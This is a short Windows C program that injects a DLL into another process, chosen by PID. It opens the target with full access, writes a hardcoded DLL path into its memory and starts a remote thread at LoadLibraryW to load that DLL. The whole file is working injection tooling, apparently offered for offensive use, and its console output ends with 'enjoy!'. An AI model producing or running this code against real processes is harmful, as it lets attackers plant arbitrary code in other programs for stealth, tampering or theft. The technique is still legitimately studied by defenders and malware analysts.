#include <stdio.h>
#include <windows.h>

// DLL Injection: OpenProcess() -> VirtualAllocEx() -> WriteProcessMemory() -> CreateRemoteThreadEx()

PVOID rBuffer;
HANDLE hProcess;
wchar_t dllLocation[] = TEXT("C:\\Users\\Niko Bellic\\Desktop\\Tools\\DLL Injection\\example.dll");

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("(!) usage: dll.exe <pid>");
		return EXIT_FAILURE;
	}

	DWORD PID = atoi(argv[1]);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, 
		FALSE, 
		PID);

	if (!hProcess || hProcess == NULL) {
		printf("(!) could not create handle to process [%d]", PID);
		return EXIT_FAILURE;
	}

	printf("(+) created handle to process\n");
	printf("(*) allocating memory within process...\n");
	printf("(*) path to DLL ['%S']\n", dllLocation);

	rBuffer = VirtualAllocEx(hProcess, 
		rBuffer, 
		sizeof(dllLocation), 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	printf("(+) allocated space within process\n\n");
	printf("\t(*) VirtualAllocEx() [flProtect -> PAGE_READWRITE]\n");
	printf("\t(*) VirtualAllocEx() [flAllocationType -> MEM_COMMIT | MEM_RESERVE]\n\n\r");
	printf("(*) writing to process memory...\n");

	WriteProcessMemory(hProcess, 
		rBuffer, 
		(LPVOID)dllLocation, 
		sizeof(dllLocation), 
		NULL);

	printf("(+) wrote to process memory\n");
	printf("(*) getting library [LoadLibraryW() -> Kernel32] address...\n\n");
	printf("\t(*) starting PTHREAD_START_ROUTINE...\n\n");

	PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

	printf("(+) PTHREAD_START_ROUTINE done, loading library address done\n");
	printf("(*) creating remote thread...\n");

	CreateRemoteThread(hProcess, 
		NULL, 
		0, 
		startRoutine, 
		rBuffer, 
		0, 
		NULL);

	printf("(+) thread created, enjoy!\n");
	printf("(*) closing handle to process...\n");

	CloseHandle(hProcess);

	printf("(+) finished");

	return EXIT_SUCCESS;
}
